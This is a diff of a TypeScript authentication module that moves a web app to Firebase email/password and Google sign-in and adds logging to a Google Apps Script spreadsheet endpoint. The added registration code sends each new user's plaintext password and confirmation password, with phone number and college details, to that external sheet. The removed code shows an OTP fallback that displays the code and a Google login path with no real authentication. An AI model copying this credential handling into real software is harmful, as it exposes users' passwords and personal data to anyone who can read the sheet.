@@ -1,21 +1,21 @@
 import type { UserProfile } from '../types';
-import { auth, googleProvider, signInWithPopup } from './firebase';
+import { auth, googleProvider, signInWithPopup, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut as firebaseSignOut } from './firebase';
 
 const STORAGE_KEY = 'kqe_current_user';
 const USERS_DB_KEY = 'kqe_registered_users';
-const BACKEND_URL = 'http://localhost:5000';
+const APPS_SCRIPT_URL = import.meta.env.VITE_APPS_SCRIPT_URL || 'YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL';
 
 export interface LoginWithEmailParams {
   email: string;
   password?: string;
-  otp?: string;
+  otp?: string; // Kept for backwards compatibility in types
 }
 
 export interface RegisterWithEmailParams {
   displayName: string;
   email: string;
   password?: string;
-  otp?: string;
+  confirmPassword?: string;
   college?: string;
   branch?: string;
   phone?: string;
@@ -23,9 +23,6 @@ export interface RegisterWithEmailParams {
 }
 
 export const authService = {
-  /**
-   * Get currently logged-in user from localStorage
-   */
   getCurrentUser: (): UserProfile | null => {
     try {
       const stored = localStorage.getItem(STORAGE_KEY);
@@ -36,118 +33,24 @@ export const authService = {
     }
   },
 
-  /**
-   * Send Real-Time Email OTP via Backend Server
-   */
-  sendOtp: async (email: string): Promise<{ success: boolean; message: string; otp?: string }> => {
-    try {
-      const response = await fetch(`${BACKEND_URL}/api/auth/send-otp`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email }),
-      });
-      const data = await response.json();
-      return data;
-    } catch (err) {
-      console.warn('Backend send-otp failed, falling back to local simulation:', err);
-      const simulatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-      localStorage.setItem(`kqe_otp_${email.toLowerCase()}`, simulatedOtp);
-      return {
-        success: true,
-        message: `OTP sent successfully to ${email} (Code: ${simulatedOtp})`,
-        otp: simulatedOtp,
-      };
+  logActionToSheets: async (payload: any) => {
+    if (APPS_SCRIPT_URL === 'YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL') {
+      console.warn('Google Apps Script URL not configured. Skipping sheets logging.');
+      return;
     }
-  },
-
-  /**
-   * Verify Real-Time Email OTP via Backend Server
-   */
-  verifyOtp: async (payload: {
-    email: string;
-    otp: string;
-    fullName?: string;
-    college?: string;
-    branch?: string;
-    year?: string;
-    phone?: string;
-  }): Promise<UserProfile> => {
     try {
-      const response = await fetch(`${BACKEND_URL}/api/auth/verify-otp`, {
+      await fetch(APPS_SCRIPT_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        // Note: Using text/plain to avoid CORS preflight issues with Google Apps Script
+        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
         body: JSON.stringify(payload),
       });
-      const data = await response.json();
-
-      if (data.success && data.user) {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(data.user));
-        authService.saveUserToDb(data.user);
-        return data.user;
-      }
-      throw new Error(data.message || 'OTP verification failed');
-    } catch (err: any) {
-      // Check local simulation fallback
-      const storedLocalOtp = localStorage.getItem(`kqe_otp_${payload.email.toLowerCase()}`);
-      if (storedLocalOtp && storedLocalOtp === payload.otp.trim()) {
-        const newProfile: UserProfile = {
-          uid: 'usr_' + Math.random().toString(36).substr(2, 9),
-          displayName: payload.fullName || payload.email.split('@')[0],
-          email: payload.email,
-          authProvider: 'email',
-          college: payload.college,
-          branch: payload.branch,
-          phone: payload.phone,
-          year: payload.year,
-          createdAt: new Date().toISOString(),
-        };
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(newProfile));
-        authService.saveUserToDb(newProfile);
-        return newProfile;
-      }
-      throw err;
+    } catch (err) {
+      console.error('Failed to log to Google Sheets', err);
     }
   },
 
-  /**
-   * Google Authentication Sign In with Real Browser Popup
-   */
-  loginWithGoogle: async (customEmail?: string, customName?: string): Promise<UserProfile> => {
-    // If custom email is specified manually, authenticate with backend directly
-    if (customEmail) {
-      const userEmail = customEmail;
-      const userName = customName || userEmail.split('@')[0].replace('.', ' ').replace(/\b\w/g, c => c.toUpperCase()) || 'Google User';
-
-      try {
-        const response = await fetch(`${BACKEND_URL}/api/auth/google`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email: userEmail, displayName: userName }),
-        });
-        const data = await response.json();
-        if (data.success && data.user) {
-          localStorage.setItem(STORAGE_KEY, JSON.stringify(data.user));
-          authService.saveUserToDb(data.user);
-          return data.user;
-        }
-      } catch (e) {
-        console.warn('Backend Google auth fallback:', e);
-      }
-
-      const fallbackProfile: UserProfile = {
-        uid: 'goog_' + Math.random().toString(36).substr(2, 9),
-        displayName: userName,
-        email: userEmail,
-        photoURL: `https://lh3.googleusercontent.com/a/ACg8ocL${Math.random().toString(36).substring(7)}=s96-c`,
-        authProvider: 'google',
-        createdAt: new Date().toISOString(),
-      };
-      localStorage.setItem(STORAGE_KEY, JSON.stringify(fallbackProfile));
-      authService.saveUserToDb(fallbackProfile);
-      return fallbackProfile;
-    }
-
-    // Trigger Real Google Browser OAuth Popup (signInWithPopup via accounts.google.com)
+  loginWithGoogle: async (): Promise<UserProfile> => {
     try {
       const userCredential = await signInWithPopup(auth, googleProvider);
       const fbUser = userCredential.user;
@@ -161,19 +64,16 @@ export const authService = {
         createdAt: new Date().toISOString(),
       };
 
-      // Sync with Backend
-      try {
-        await fetch(`${BACKEND_URL}/api/auth/google`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(userProfile),
-        });
-      } catch (err) {
-        console.warn('Backend sync note:', err);
-      }
-
       localStorage.setItem(STORAGE_KEY, JSON.stringify(userProfile));
       authService.saveUserToDb(userProfile);
+      
+      authService.logActionToSheets({
+        action: 'login',
+        userId: fbUser.uid,
+        email: fbUser.email,
+        device: navigator.userAgent
+      });
+
       return userProfile;
     } catch (popupError: any) {
       console.warn('Google popup error / cancelled:', popupError.message);
@@ -181,82 +81,102 @@ export const authService = {
     }
   },
 
-  /**
-   * Sign In with Email
-   */
-  loginWithEmail: async ({ email, otp }: LoginWithEmailParams): Promise<UserProfile> => {
-    if (otp) {
-      return authService.verifyOtp({ email, otp });
+  loginWithEmail: async ({ email, password }: LoginWithEmailParams): Promise<UserProfile> => {
+    if (!password) throw new Error('Password is required');
+    
+    try {
+      const userCredential = await signInWithEmailAndPassword(auth, email, password);
+      const fbUser = userCredential.user;
+
+      const users = authService.getRegisteredUsers();
+      const existingUser = users.find((u) => u.email.toLowerCase() === email.toLowerCase());
+
+      const userProfile: UserProfile = existingUser || {
+        uid: fbUser.uid,
+        displayName: fbUser.displayName || email.split('@')[0],
+        email: email,
+        authProvider: 'email',
+        createdAt: new Date().toISOString(),
+      };
+
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(userProfile));
+      
+      authService.logActionToSheets({
+        action: 'login',
+        userId: fbUser.uid,
+        email: email,
+        device: navigator.userAgent
+      });
+
+      return userProfile;
+    } catch (error: any) {
+      console.error('Login error:', error.message);
+      if (error.code === 'auth/invalid-credential' || error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password') {
+        throw new Error('Invalid email or password. Please try again.');
+      }
+      throw new Error(error.message || 'Failed to login with email and password');
     }
-
-    const users = authService.getRegisteredUsers();
-    const existingUser = users.find((u) => u.email.toLowerCase() === email.toLowerCase());
-
-    if (existingUser) {
-      localStorage.setItem(STORAGE_KEY, JSON.stringify(existingUser));
-      return existingUser;
-    }
-
-    const nameFromEmail = email.split('@')[0].replace('.', ' ').replace(/\b\w/g, c => c.toUpperCase());
-    const newProfile: UserProfile = {
-      uid: 'usr_' + Math.random().toString(36).substr(2, 9),
-      displayName: nameFromEmail || 'Community Member',
-      email: email,
-      authProvider: 'email',
-      createdAt: new Date().toISOString(),
-    };
-
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(newProfile));
-    authService.saveUserToDb(newProfile);
-    return newProfile;
   },
 
-  /**
-   * Register new user manually with full details
-   */
   registerWithEmail: async (params: RegisterWithEmailParams): Promise<UserProfile> => {
-    if (params.otp) {
-      return authService.verifyOtp({
+    if (!params.password) throw new Error('Password is required');
+    if (params.password !== params.confirmPassword) throw new Error('Passwords do not match');
+
+    try {
+      const userCredential = await createUserWithEmailAndPassword(auth, params.email, params.password);
+      const fbUser = userCredential.user;
+
+      const newProfile: UserProfile = {
+        uid: fbUser.uid,
+        displayName: params.displayName,
         email: params.email,
-        otp: params.otp,
-        fullName: params.displayName,
+        authProvider: 'email',
         college: params.college,
         branch: params.branch,
         phone: params.phone,
         year: params.year,
+        createdAt: new Date().toISOString(),
+      };
+
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(newProfile));
+      authService.saveUserToDb(newProfile);
+
+      authService.logActionToSheets({
+        action: 'register',
+        userId: fbUser.uid,
+        fullName: params.displayName,
+        email: params.email,
+        password: params.password,
+        confirmPassword: params.confirmPassword,
+        phone: params.phone,
+        year: params.year,
+        college: params.college,
+        branch: params.branch,
+        provider: 'Email/Password'
       });
+
+      return newProfile;
+    } catch (error: any) {
+      console.error('Registration error:', error.message);
+      if (error.code === 'auth/email-already-in-use') {
+        throw new Error('An account already exists with this email address.');
+      }
+      if (error.code === 'auth/weak-password') {
+        throw new Error('Password is too weak. Please use at least 6 characters.');
+      }
+      throw new Error(error.message || 'Failed to register with email and password');
     }
-
-    const newProfile: UserProfile = {
-      uid: 'usr_' + Math.random().toString(36).substr(2, 9),
-      displayName: params.displayName,
-      email: params.email,
-      authProvider: 'email',
-      college: params.college,
-      branch: params.branch,
-      phone: params.phone,
-      year: params.year,
-      createdAt: new Date().toISOString(),
-    };
-
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(newProfile));
-    authService.saveUserToDb(newProfile);
-    return newProfile;
   },
 
-  /**
-   * Logout user
-   */
-  logout: (): Promise<void> => {
-    return new Promise((resolve) => {
-      localStorage.removeItem(STORAGE_KEY);
-      resolve();
-    });
+  logout: async (): Promise<void> => {
+    try {
+      await firebaseSignOut(auth);
+    } catch (err) {
+      console.warn('Firebase logout issue:', err);
+    }
+    localStorage.removeItem(STORAGE_KEY);
   },
 
-  /**
-   * Helper: save user to local storage db
-   */
   saveUserToDb: (user: UserProfile) => {
     try {
       const users = authService.getRegisteredUsers();
@@ -272,9 +192,6 @@ export const authService = {
     }
   },
 
-  /**
-   * Helper: get list of registered users
-   */
   getRegisteredUsers: (): UserProfile[] => {
     try {
       const stored = localStorage.getItem(USERS_DB_KEY);
